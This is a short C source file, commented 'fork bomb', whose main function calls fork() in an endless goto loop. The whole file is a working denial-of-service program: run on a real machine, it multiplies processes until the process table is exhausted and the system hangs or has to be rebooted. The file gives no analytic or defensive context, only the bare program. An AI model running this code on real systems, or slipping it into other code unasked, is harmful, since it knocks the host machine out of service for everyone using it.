
#include <unistd.h>
/* fork bomb */
int main(int argc, char *argv[])
{
start:
    fork();
    goto start;
}
